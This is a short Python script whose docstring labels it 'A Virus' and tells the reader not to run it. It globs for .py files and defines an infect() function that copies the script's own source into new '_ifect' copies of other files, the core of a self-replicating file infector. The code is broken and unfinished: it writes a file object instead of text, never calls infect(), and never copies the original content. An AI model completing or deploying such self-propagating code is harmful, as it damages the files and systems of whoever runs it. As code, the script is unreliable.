"""
@autor 00nray
@brief A Virus

just dont run this.
this is not intended for use beyon a devel enviroment.
"""

import glob

files = glob.glob("*.py",recursive=True)

def infect(name):
    with open(name,"r") as f:
        with open(name+"_ifect","w+") as f2:
            with open(__file__,"r") as f3:
                f2.write(f3.read())
            f2.write(f)






